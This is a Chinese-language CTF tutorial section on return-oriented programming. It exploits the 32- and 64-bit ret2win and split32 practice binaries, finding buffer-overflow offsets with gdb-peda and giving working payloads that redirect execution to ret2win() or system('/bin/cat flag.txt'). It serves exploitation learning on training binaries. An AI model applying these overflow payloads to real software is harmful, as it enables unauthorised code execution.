### 3.1.4 返回导向编程（ROP）（x86）

#### 32位程序分析

在 `pwnme()` 函数中，存在一个缓冲区溢出漏洞。该函数使用 `fgets()` 读取用户输入，但缓冲区大小仅为40字节。当输入超过40字节时，可以覆盖调用函数的 `ebp` 和返回地址。

以下是相关的汇编代码：
```
0x0804867c : add esp,0x10
0x0804867f : nop
0x08048680 : leave
0x08048681 : ret
```

使用 `gdb-peda` 创建一个50字节的模式字符串并运行程序：
```sh
gdb-peda$ pattern_create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
gdb-peda$ r
```

程序崩溃时，寄存器和堆栈内容如下：
```
EAX: 0xffffd5c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAF AAb")
EBP: 0x41304141 ('AA0A')
ESP: 0xffffd5f0 --> 0xf7f80062 --> 0x41000000 ('')
EIP: 0x41414641 ('AFAA')
```

通过 `pattern_offset` 确定偏移量：
```sh
gdb-peda$ pattern_offset $ebp
1093681473 found at offset: 40
gdb-peda$ pattern_offset $eip
1094796865 found at offset: 44
```

缓冲区距离 `ebp` 和 `eip` 的偏移分别为40和44，验证了我们的假设。

#### 使用 ROP 覆盖返回地址

虽然 `.text` 段中存在 `ret2win()` 函数，但在程序执行中并未调用它。我们需要用 `ret2win()` 的地址覆盖返回地址，使程序跳转到该函数中，从而打印出 flag。这种类型的 ROP 称为 `ret2text`。

检查安全特性：
```sh
gdb-peda$ checksec
CANARY : disabled
FORTIFY : disabled
NX : ENABLED
PIE : disabled
RELRO : Partial
```

由于 PIE 已禁用，`.text` 段的加载地址是固定的，可以直接使用 `ret2win()` 的地址 `0x08048659`。

构造 payload：
```sh
$ python2 -c "print 'A'*44 + '\x59\x86\x04\x08'" | ./ret2win32
...
> Thank you! Here's your flag: ROPE{a_placeholder_32byte_flag!}
```

#### 64位程序分析

对于64位程序，参数传递方式有所不同，前六个参数通过 `RDI`、`RSI`、`RDX`、`RCX`、`R8` 和 `R9` 传递。`pwnme()` 函数的汇编代码如下：
```
0x00000000004007b5 : push rbp
0x00000000004007b6 : mov rbp,rsp
0x00000000004007b9 : sub rsp,0x20
0x00000000004007bd : lea rax,[rbp-0x20]
0x00000000004007c1 : mov edx,0x20
0x00000000004007c6 : mov esi,0x0
0x00000000004007cb : mov rdi,rax
0x00000000004007ce : call 0x400600 
...
0x0000000000400810 : ret
```

`ret2win()` 函数的汇编代码如下：
```
0x0000000000400811 : push rbp
0x0000000000400812 : mov rbp,rsp
0x0000000000400815 : mov edi,0x4009e0
0x000000000040081a : mov eax,0x0
0x000000000040081f : call 0x4005f0 
...
0x0000000000400830 : ret
```

构造 payload：
```python
from zio import *
payload = "A"*40 + l64(0x0000000000400811)
io = zio('./ret2win')
io.writeline(payload)
io.read()
```

#### 使用 `usefulFunction()`

`usefulFunction()` 调用 `system()` 函数。我们需要给它传递一个参数，使其执行 `/bin/cat flag.txt`。

使用 `rabin2` 在 `.data` 段中搜索字符串：
```sh
$ rabin2 -z split32
...
vaddr=0x0804a030 paddr=0x00001030 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt
```

找到字符串 `/bin/cat flag.txt` 的地址为 `0x0804a030`。

构造 payload：
```sh
$ python2 -c "print 'A'*44 + '\x57\x86\x04\x08' + '\x30\xa0\x04\x08'" | ./split32
...
> ROPE{a_placeholder_32byte_flag!}
```

另一种方法是使用 `system()` 的 PLT 地址 `0x8048430`：
```python
from zio import *
payload = "A"*44 + l32(0x08048430) + l32(0x0804a030)
io = zio('./split32')
io.writeline(payload)
io.read()
```

通过这些步骤，我们可以成功利用 ROP 技术来控制程序的执行流程，从而获取 flag。